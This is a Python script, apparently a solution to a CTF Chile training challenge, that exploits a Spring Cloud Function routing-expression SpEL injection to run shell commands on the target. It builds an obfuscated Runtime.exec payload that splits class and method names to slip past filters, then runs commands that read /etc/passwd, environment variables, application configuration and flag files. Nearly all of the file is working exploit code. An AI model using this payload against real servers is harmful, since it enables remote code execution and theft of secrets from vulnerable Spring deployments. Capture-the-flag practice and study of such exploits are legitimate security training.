#!/usr/bin/env python3
"""
CTF Chile - BÚSQUEDA SIMPLE DE FLAG
Comandos básicos para encontrar la flag
"""
import requests
import re

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🔍 BÚSQUEDA SIMPLE DE FLAG")
print("=" * 40)

def build_payload(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    return payload

def try_command(cmd, desc):
    print(f"   🔎 {desc}")
    payload = build_payload(cmd)

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=10)

        response = r.text.strip()

        # Buscar flags inmediatamente
        flag_patterns = [r'CTF\{[^}]+\}', r'FLAG\{[^}]+\}', r'flag\{[^}]+\}']
        for pattern in flag_patterns:
            matches = re.findall(pattern, response, re.IGNORECASE)
            if matches:
                print(f"   🏆 FLAG ENCONTRADA: {matches[0]}")
                return matches[0]

        # Mostrar respuesta si es útil
        if len(response) > 10 and "Internal Server Error" not in response:
            print(f"   📄 {response[:200]}")

        return response

    except Exception as e:
        print(f"   ❌ Error: {e}")
        return None

# Comandos simples para buscar la flag
simple_commands = [
    ("whoami", "Usuario actual"),
    ("pwd", "Directorio actual"),
    ("ls -la", "Listar archivos"),
    ("cat /flag", "Flag en raíz"),
    ("cat /app/flag", "Flag en app"),
    ("cat flag.txt", "Flag local"),
    ("find . -name '*flag*'", "Buscar flags locales"),
    ("env", "Variables entorno"),
    ("cat /proc/version", "Versión sistema"),
    ("ls /home", "Directorios home"),
    ("cat /etc/passwd", "Usuarios sistema")
]

print("[1] Comandos básicos del sistema...")

for cmd, desc in simple_commands:
    result = try_command(cmd, desc)
    if result and ("CTF{" in str(result) or "FLAG{" in str(result)):
        print(f"🎯 FLAG ENCONTRADA CON COMANDO '{cmd}': {result}")
        break

print("\n[2] Búsqueda específica en aplicación...")

# Comandos específicos de la aplicación
app_commands = [
    ("cat application.properties", "Configuración app"),
    ("cat config.properties", "Config propiedades"),
    ("grep -r 'CTF' .", "Buscar CTF en directorio"),
    ("grep -r 'flag' .", "Buscar flag en directorio"),
    ("strings app.jar | grep CTF", "Strings en JAR"),
    ("ls -la /app", "Contenido /app"),
    ("cat /app/application.yml", "Config YAML"),
]

for cmd, desc in app_commands:
    result = try_command(cmd, desc)
    if result and ("CTF{" in str(result) or "FLAG{" in str(result)):
        print(f"🎯 FLAG ENCONTRADA: {result}")
        break

print("=" * 40)